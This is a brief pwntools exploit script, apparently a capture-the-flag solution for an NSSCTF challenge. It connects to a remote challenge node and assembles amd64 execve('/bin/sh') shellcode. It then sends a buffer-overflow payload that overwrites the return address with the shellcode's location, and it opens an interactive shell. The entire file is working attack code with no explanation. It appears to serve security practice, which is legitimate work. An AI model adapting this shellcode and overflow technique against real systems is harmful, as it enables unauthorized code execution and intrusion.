from pwn import *

p = process("shell")
p = remote("node4.anna.nssctf.cn",28430)
context.arch = "amd64"

sc = """
xor rsi, rsi           
xor rdx, rdx          
mov rbx, 0x0068732f6e69622f  
push rbx
mov rdi,rsp
mov rax,0x3b
syscall
"""

sc = asm(sc)
name = 0x6010a0
payload = b"a"*(0xa+8) + p64(name)

p.sendafter("Please.\n",sc)

#gdb.attach(p)
p.sendlineafter("Let's start!\n",payload)


p.interactive()